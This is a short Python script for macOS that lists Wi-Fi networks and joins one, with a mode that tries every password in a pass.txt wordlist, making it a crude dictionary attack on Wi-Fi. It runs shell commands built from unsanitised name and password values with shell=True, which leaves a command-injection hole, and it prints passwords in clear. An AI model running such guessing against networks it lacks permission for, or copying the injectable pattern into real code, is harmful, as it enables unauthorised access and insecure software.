import subprocess
import sys
import argparse

parser = argparse.ArgumentParser()

def list_networks():
    if sys.platform.startswith('darwin'):
        command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        print(result.stdout)
        
        
def connect_network(name, password):
    command = ""
    print("Connecting to " + name + " with password: " + password)

    if sys.platform.startswith('darwin'):
        command = f"networksetup -setairportnetwork en0 {name} {password}"
        
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    if not "Failed" in result.stdout:
        print(f"Successfully connected to {name}")
        return 0
    else:
        return 1

def get_pass():
    with open('pass.txt', 'r') as f:
        passwords = f.readlines()

parser.add_argument("-l", "--list", help="List available networks", action="store_true")
parser.add_argument("-c", "--connect", help="Connect to a network", action="store_true")
parser.add_argument("-n", "--name", help="Network name")
parser.add_argument("-p", "--password", help="Network password")


if __name__ == "__main__":

    args = parser.parse_args()

    if args.list:
        list_networks()

    if args.connect:
        if args.name and args.password:
            connect_network(args.name, args.password)
        elif not args.password:
            print("Will try to find password")
            with open('pass.txt', 'r') as f:
                passwords = f.readlines()
            
            for password in passwords:
                print("trying: " + password)
                result = connect_network(args.name, password)
                if result == 0:
                    print("Successfully connected to " + args.name + " with password: " + password)
                    break

        else:
            print("Please provide a network name and optional password")